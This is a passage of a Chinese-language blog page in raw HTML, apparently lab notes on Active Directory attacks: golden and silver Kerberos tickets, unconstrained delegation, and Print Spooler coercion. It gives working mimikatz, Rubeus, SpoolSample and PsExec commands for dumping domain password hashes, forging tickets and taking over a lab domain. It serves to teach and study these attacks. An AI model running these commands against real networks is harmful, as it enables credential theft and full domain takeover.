值</li>\n<li>域的 KRBTGT 账号的 HASH</li>\n<li>伪造任意用户名</li>\n</ol>\n</li>\n<li>前面使用 MS14-068 获取了域控权限，可以使用 PsExec 进行反弹 cmd</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">PsExec64.exe &#x2F;accepteula &#x2F;s \\\\WIN-9ESHUR52A3G.moonsec.fbi cmd\nklist #查看当前内存中的票据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911193430175.png\" alt=\"image-20220911193430175\"></p>\n<ul>\n<li>需要上传 mimikatz 进行执行，这里直接使用域控主机执行命令</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">mimikatz(commandline) # privilege::debug\nmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;all &#x2F;csvn 或 lsadump::lsa &#x2F;inject\nmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonhack.com &#x2F;user:krbtgt\n#建议使用下面这条，可以将hash和SID一起导出\nmimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;user:krbtgt&quot; &quot;exit&quot; &gt; loghash.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911194144263.png\" alt=\"image-20220911194144263\"></p>\n<ul>\n<li>使用 mimikatz 生成金票.kirbi 文件并保存 ——<mark> 该步骤在获取了 SID 和 HASH 之后在普通域用户主机上执行</mark></li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">mimikatz.exe &quot;kerberos::golden &#x2F;admin:system &#x2F;domain:moonsec.fbi &#x2F;sid:S-1-5-21-3501430782-1563410060-2157377696 &#x2F;krbtgt:39e3601fba3f45772f3055ca9554af1f &#x2F;ticket:ticket.kirbi&quot; exit\n#&#x2F;admin:伪造的用户名\n#&#x2F;domain:域名称\n#&#x2F;sid:SID值，注意是去掉最后一个-的SID值\n#krbtgt:krbtgt的hash值\n#&#x2F;ticket:生成的票据名称 &#x2F;&#x2F;不是写入内存中的命令<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911195902366.png\" alt=\"image-20220911195902366\"></p>\n<hr>\n<ul>\n<li>黄金票据的使用：普通域账户利用黄金票据创建域管理员账户</li>\n<li>使用普通域用户，通过 mimikatz 中的 kerberos::ptt 功能将 ticket.kirbi 导入内存中</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">mimikatz # kerberos::purge #清除内存凭证缓存\nmimikatz # kerberos::ptt C:\\Users\\test\\ticket.kirbi #导入票据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911195457608.png\" alt=\"image-20220911195457608\"></p>\n<ul>\n<li>导入后可执行上述创建域用户并提升为域管理员权限</li>\n</ul>\n<h4 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h4>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">klist #查看当前内存中的票据<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>\n<p>如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC， 但是伪造的门票只对部分服务起作用</p>\n</li>\n<li>\n<p>特点：</p>\n<ol>\n<li>不需要与 KDC 交互</li>\n<li>需要 server 的 NTLM Hash</li>\n</ol>\n</li>\n<li>\n<p>mimikatz 制作银票：</p>\n</li>\n<li>\n<p>登录到域服务器的 administrator，执行 mimikatz 的命令获取 NTLM 和 SID</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">whoami &#x2F;all #获取SID\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt #获取hash<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911201825408.png\" alt=\"image-20220911201825408\"></p>\n<ul>\n<li>使用 mimikatz 清空票据，再导入伪造的银票 —— 在普通域用户执行</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">kerberos::purge\nkerberos::golden /domain:moonsec.fbi /sid:S-1-5-21-3068616892-3890610424-3278931909 /target:12server-dc.moonsec.fbi /service:cifs /rc4:42e2656ec24331269f82160ff5962387 /user:administrator /ptt\nkerberos::golden /domain:<span class=\"token operator\">&lt;</span>域名<span class=\"token operator\">></span> /sid:<span class=\"token operator\">&lt;</span>域 SID<span class=\"token operator\">></span> /target:<span class=\"token operator\">&lt;</span>目标服务器主机名<span class=\"token operator\">></span>/service:<span class=\"token operator\">&lt;</span>服务类型<span class=\"token operator\">></span> /rc4:<span class=\"token operator\">&lt;</span>NTLM Hash<span class=\"token operator\">></span> /user:<span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span> /ptt\n<span class=\"token comment\">#其中用户名可以随便写，服务类型根据以下的选择，因为没有TGT去不断申请ticket，只能针对某一服务来进行伪造</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911202648684.png\" alt=\"image-20220911202648684\"></p>\n<ul>\n<li>-_-mimikatz 复现失败</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911202615993.png\" alt=\"image-20220911202615993\"></p>\n<hr>\n<ul>\n<li>kekeo 制作银票</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">kerberos::purge <span class=\"token comment\">#清空票据缓存</span>\ntgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec24331269f82160ff5962387\n<span class=\"token comment\">#tgt::ask /user:用户名 /domain:域名 /ntlm:NTLM Hash</span>\nkerberos::ptt TGT_administrator@MOONSEC.FBI_krbtgt~moonsec.fbi@MOONSEC.FBI.kirbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911203413426.png\" alt=\"image-20220911203413426\"></p>\n<h4 id=\"金票和银票的区别\"><a class=\"markdownIt-Anchor\" href=\"#金票和银票的区别\">#</a> 金票和银票的区别</h4>\n<ul>\n<li>获取的权限不同\n<ul>\n<li>金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限</li>\n<li>银票：伪造的 ST，只能访问指定的服务，如 CIFS</li>\n</ul>\n</li>\n<li>认证流程不同\n<ul>\n<li>金票：同 KDC 交互，但不同 AS 交互</li>\n<li>银票：不同 KDC 交互，直接访问 Server</li>\n</ul>\n</li>\n<li>加密方式不同\n<ul>\n<li>金票：由 krbtgt NTLM Hash 加密</li>\n<li>银票：由服务账号 NTLM Hash 加密</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"域委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#域委派攻击\">#</a> 域委派攻击</h1>\n<h2 id=\"1-域委派的相关知识\"><a class=\"markdownIt-Anchor\" href=\"#1-域委派的相关知识\">#</a> 1、域委派的相关知识</h2>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1.1-1.5 来源：————————————————<br>\n 版权声明：本文为 CSDN 博主「山山而川’」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>\n原文链接：<a href=\"https://blog.csdn.net/qq_44159028/article/details/123994104\">https://blog.csdn.net/qq_44159028/article/details/123994104</a></p></blockquote>\n<h3 id=\"11-什么是委派\"><a class=\"markdownIt-Anchor\" href=\"#11-什么是委派\">#</a> 1.1 什么是委派</h3>\n<ul>\n<li>\n<p>首先了解一下什么是委派，委派即委托安排，我把这件事委托给你做了。域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>\n</li>\n<li>\n<p>委派主要分为<mark>非约束委派 (Unconstrained delegation)<mark> 和</mark>约束委派 (Constrained delegation)<mark> 两个方式，还有一种是</mark>基于资源的约束委派（Resource Based Constrained Delegation）</mark></p>\n</li>\n</ul>\n<h3 id=\"12-委派的由来\"><a class=\"markdownIt-Anchor\" href=\"#12-委派的由来\">#</a> 1.2 委派的由来</h3>\n<ul>\n<li>在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 kerberos 向 web server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为 &quot;kerberos 双跳问题&quot;，并且要求进行委派，以便 web server 在修改数据库记录时模拟用户。</li>\n<li><strong>这里说的 &quot;以便 web server 在修改数据库记录时模拟用户&quot; 需要如何理解？</strong></li>\n<li>比如数据库中的相关数据需要修改，如果此时如果是让当前的 web server 的服务账户去进行修改的话，那么也就无法记录到到底是谁去修改了这个数据，此时如果出了问题就不知道该去问谁了，这种业务情况下就可能就是需要委派这种功能来进行解决，那么委派之后的情况就是，让当前的 web server 的服务账户去操作，但是 web server 同样带有客户的信息，在修改相关数据的时候，用的是对应客户操作者的记录</li>\n</ul>\n<h3 id=\"13-为什么使用域委派\"><a class=\"markdownIt-Anchor\" href=\"#13-为什么使用域委派\">#</a> 1.3 为什么使用域委派</h3>\n<ul>\n<li>为什么需要域委派呢，比如现在有 web 服务器和文件服务器，当用户 A 访问 web 服务器去请求某个资源时，web 服务器上本身并没有该资源，所以 web 服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：用户 A 访问 web 服务器，服务器再以用户 A 的身份去访问文件服务器</li>\n</ul>\n<h3 id=\"14-域委派流程\"><a class=\"markdownIt-Anchor\" href=\"#14-域委派流程\">#</a> 1.4 域委派流程</h3>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212008433.png\" alt=\"image-20220911212008433\"></p>\n<ul>\n<li>一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服务后，前台运行 WEB 服务的服务账号 websvc 模拟 (Impersonate) 用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中单跳或者多跳的 Kerberos 认证</li>\n<li>流程\n<ol>\n<li>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器</li>\n<li>Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请</li>\n<li>KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT</li>\n<li>websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 ST</li>\n<li>KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 ST</li>\n<li>websvc 收到的 jack 用户的授权票据 ST 后，可访问文件服务，完成多跳认证</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"15-委派的用户\"><a class=\"markdownIt-Anchor\" href=\"#15-委派的用户\">#</a> 1.5 委派的用户</h3>\n<ul>\n<li>在域内的可以委派的账户有两种一，种是主机账户（Net Computer），另一种是用 <strong>setspn</strong> 手动添加的服务账户（Net User）\n<ul>\n<li>服务账号 (Service Account)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录，也就是说无法通过 SqlServiceAccount 来通过 3389 进行 rdp 登录</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212222081.png\" alt=\"image-20220911212222081\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212233024.png\" alt=\"image-20220911212233024\"></p>\n<hr>\n<h3 id=\"16-三种委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#16-三种委派攻击\">#</a> 1.6 三种委派攻击</h3>\n<p>分别是：</p>\n<ul>\n<li>非约束委派攻击</li>\n<li>约束委派攻击</li>\n<li>资源委派攻击</li>\n</ul>\n<h2 id=\"2-非约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#2-非约束委派攻击\">#</a> 2、非约束委派攻击</h2>\n<ul>\n<li>非约束性委派的原理是：用户想访问服务 A，于是向 KDC 提交认证，KDC 发现 A 是非约束性委派，会把 TGT 放在 ST 中一并给用户。然后用户用这个 ST 去访问服务 A，服务 A 就相当于获得了用户的 TGT，把 TGT 放入 lsass 进程，然后就可以拿着用户的 TGT 以用户的身份去访问该用户权限能够访问的服务了</li>\n<li>从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的 TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911212450470.png\" alt=\"image-20220911212450470\"></p>\n<ul>\n<li>当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含 TRUSTED_FOR_DELEGATION</li>\n<li>当服务账号或者主机被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION，且 msDS-AllowedToDelegateTo 属性会包含被约束的服务</li>\n</ul>\n<h3 id=\"21-域环境\"><a class=\"markdownIt-Anchor\" href=\"#21-域环境\">#</a> 2.1 域环境</h3>\n<ul>\n<li>域备份主机 windows server 2012 - dc1</li>\n<li>域控主机 windows server 2012 - dc2</li>\n<li>域成员主机 windows server 2012 - 12server1</li>\n<li>域成员主机 windows server 2012 - 12server2</li>\n</ul>\n<h3 id=\"22-配置非约束主机和用户\"><a class=\"markdownIt-Anchor\" href=\"#22-配置非约束主机和用户\">#</a> 2.2 配置非约束主机和用户</h3>\n<ul>\n<li>在 dc2 添加 12server2 非约束委派主机，添加新用户 web，并将 web 赋予服务账号权限</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\"># 使用域控权限创建用户并授予服务权限\nsetspn -A https&#x2F;web web #添加用户为服务账号\nsetspn -d https&#x2F;web web #删除用户服务账号权限<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912091053783.png\" alt=\"image-20220912091053783\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912091133301.png\" alt=\"image-20220912091133301\"></p>\n<ul>\n<li>为使设置生效，可重启一遍</li>\n<li>当服务账号或者主机被设置为非约束性委派时，其<mark> userAccountControl</mark> 属性会包含<mark> TRUSTED_FOR_DELEGATION</mark></li>\n</ul>\n<h3 id=\"23-powershell查询非委派约束\"><a class=\"markdownIt-Anchor\" href=\"#23-powershell查询非委派约束\">#</a> 2.3 powershell 查询非委派约束</h3>\n<ul>\n<li>使用 powershell 脚本在<mark>普通域用户</mark>（12server1）权限下执行查询哪些主机和用户被设置了非约束委派</li>\n<li>powerview2.ps1 或者 powerview.ps1</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token comment\">#导入ps模块</span>\n<span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\PowerView<span class=\"token punctuation\">.</span>ps1\n<span class=\"token comment\">#查询非约束主机</span>\n<span class=\"token function\">Get-NetComputer</span> <span class=\"token operator\">-</span>Unconstrained <span class=\"token operator\">-</span>Domain redteam<span class=\"token punctuation\">.</span>club\n<span class=\"token comment\">#查询非约束用户</span>\n<span class=\"token function\">Get-NetUser</span> <span class=\"token operator\">-</span>Unconstrained <span class=\"token operator\">-</span>Domain redteam<span class=\"token punctuation\">.</span>club <span class=\"token punctuation\">|</span> <span class=\"token function\">select</span> name<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"24-adfind查询非约束委派\"><a class=\"markdownIt-Anchor\" href=\"#24-adfind查询非约束委派\">#</a> 2.4 adfind 查询非约束委派</h3>\n<ul>\n<li>使用 adfind.exe 在普通域用户 ==（12server1）权限下执行查询哪些主机和用户被设置了非约束委派</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">#非约束委派主机\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName\n#非约束委派用户\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912093555051.png\" alt=\"image-20220912093555051\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912092935099.png\" alt=\"image-20220912092935099\"></p>\n<h3 id=\"25-非约束委派攻击\"><a class=\"markdownIt-Anchor\" href=\"#25-非约束委派攻击\">#</a> 2.5 非约束委派攻击</h3>\n<ul>\n<li>首先使用 12server2 ping ad1，能够 ping 通，且使用 dir 命令查看 ad1 的 C 盘文件无法访问</li>\n<li>域管理员用户使用 winrm 服务器远程连接委派主机 12server2，连接成功后如下图</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token function\">Enter-PSSession</span> <span class=\"token operator\">-</span>ComputerName 12server2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912093830343.png\" alt=\"image-20220912093830343\"></p>\n<ul>\n<li>此时域管的凭证已经存储到委派域成员用户的内存中，在提权到<mark>本地管理员用户</mark>后使用 mimikatz 导出相关凭证（在 12server2 中导出）</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">privilege::debug #进入调试模式\nsekurlsa::tickets &#x2F;export #导出凭证<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094154442.png\" alt=\"image-20220912094154442\"></p>\n<ul>\n<li>使用 mimikatz 将 krbtgt 的票据导入</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">kerberos::ptt 凭证名称 <span class=\"token comment\">#导入凭证</span>\nkerberos::list <span class=\"token comment\">#查看当前存在凭证</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094359734.png\" alt=\"image-20220912094359734\"></p>\n<ul>\n<li>获取到该凭证之后，可以将此凭证保存下来，上传到 12server1 中使用 12server1 的域普通成员用户使用 mimikatz 进行导入，导入后同样可在域内访问任意主机和服务</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094815721.png\" alt=\"image-20220912094815721\"></p>\n<ul>\n<li>非约束委派就是将一个主机或用户设为非约束委派状态，诱导域控主机访问，访问后委派用户就会有域控的凭证，使用 mimikatz 导出这个凭证之后再将凭证导入到其他普通域成员主机中，就可以获取域控权限</li>\n</ul>\n<h3 id=\"26-非约束委派spooler\"><a class=\"markdownIt-Anchor\" href=\"#26-非约束委派spooler\">#</a> 2.6 非约束委派 &amp; Spooler</h3>\n<ul>\n<li>上文中的非约束委派需要域管理员主动访问委派主机或用户，才能获取相关凭证，比较鸡肋，可以使用<strong>非约束委派 + Spooler 打印机服务</strong>强制指定的主机进行连接</li>\n<li>Spooler：打印系统远程协议（MS-RPRN），一种旧的但是<mark>默认启用</mark>的服务</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912190918152.png\" alt=\"image-20220912190918152\"></p>\n<ul>\n<li>在该方法中，域用户可以使用 <code>MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>  方法强制任何运行了 Spooler 服务的计算机以通过<strong> Kerberos 或 NTLM</strong> 对攻击者选择的目标进行身份验证</li>\n</ul>\n<hr>\n<ul>\n<li>攻击复现环境\n<ul>\n<li>域：redteam.club</li>\n<li>域控：ad2</li>\n<li>备份域控：ad1</li>\n<li>域内主机：12server1、12server2</li>\n</ul>\n</li>\n<li>攻击条件：攻击者控制了一个开启了非约束委派的账户并<mark>获取了本地管理员权限</mark>，域控开启了 Spooler 服务\n<ul>\n<li>拿下一个具有 Kerberos 非约束委派的主机 (主机账户)</li>\n<li>找到一台运行 Print Spooler 服务 (默认为自启而且为 System 权限) 的 DC</li>\n<li>管理员身份使用 Rubeus 的监听模式</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>\n<p>以本地管理员权限开启<strong> Rubeus 监听</strong></p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">runas &#x2F;user:12server2\\administrator cmd.exe #在cmd中输入密码切换为本地管理员权限\nRubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$\n# 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT\n# &#x2F;interval:1 设置监听间隔1秒\n# &#x2F;filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT\n# DC$为域控的主机名字加$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li>\n<p>使用 Spoolsamlpe.exe 利用打印机服务让域控机向本机验证身份</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">spoolsample.exe ad2 12server2\n# 表示利用打印服务强制让域控机向admin-PC主机验证身份，这样我们的Rubeus就可以监听到TGS了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912192553430.png\" alt=\"image-20220912192553430\"></p>\n<p>tips：为便于复制方便，Rubeus 监听可写为</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$ &gt; log.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912192828951.png\" alt=\"image-20220912192828951\"></p>\n<p>然后可直接使用记事本的编辑 - 查找和替换删掉开头的空格</p>\n</li>\n<li>\n<p>将 TGT 使用 powershell 直接运行转换到正常的 TGT，这样就可以得到正常的 TGT</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token namespace\">[IO.File]</span>::WriteAllBytes<span class=\"token punctuation\">(</span><span class=\"token string\">\"ticket.kirbi\"</span><span class=\"token punctuation\">,</span> <span class=\"token namespace\">[Convert]</span>::FromBase64String<span class=\"token punctuation\">(</span><span class=\"token string\">\"得到的base64\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912193148733.png\" alt=\"image-20220912193148733\"></p>\n</li>\n<li>\n<p>将这个 TGT 票据注入到当前会话中，导出域控的所有 hash，就可以获得 krbtgt 的 hash</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\"># mimikatz以域用户身份运行\nkerberos::ptt ticket.kirbi\nmimikatz.exe &quot;lsadump::dcsync &#x2F;domain:redteam.club &#x2F;all &#x2F;csv&quot; &quot;exit&quot; &gt; hash.txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912193541403.png\" alt=\"image-20220912193541403\"></p>\n</li>\n</ol>\n<ul>\n<li>注意：<strong>我们这儿获得的 TGT 票据，不能算黄金票据，因为我们获得的权限只是域控的本地管理权限，所以 *<em> 不能连接域控 *</em>，但是我们确可以因此获取所以用户的 hash，所以能制作真正的黄金票据～</strong></li>\n</ul>\n<h3 id=\"27-spooler制作黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#27-spooler制作黄金票据\">#</a> 2.7 Spooler 制作黄金票据</h3>\n<ul>\n<li>通过上述获取了 krbtgt 的 hash 之后，再获取本账号的 SID，就可以制作黄金票据</li>\n</ul>\n<ol>\n<li>\n<p>获取本账号的 sid</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">whoami &#x2F;domain 或 whoami &#x2F;user\n#S-1-5-21-2365300756-2663045586-4193326672-1105 注意不要后面的1105<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li>\n<p>使用 mimikatz 制作黄金票据</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">mimikatz &quot;kerberos::golden &#x2F;domain:redteam.club &#x2F;sid:S-1-5-21-2365300756-2663045586-4193326672 &#x2F;krbtgt:b6e0fcce3106665064de4917394ccc27 &#x2F;user:administrator &#x2F;ticket:ntlm.kirbi&quot; &quot;exit&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li>\n<p>使用 mimikatz 导入票据</p>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt ntlm.kirbi&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img 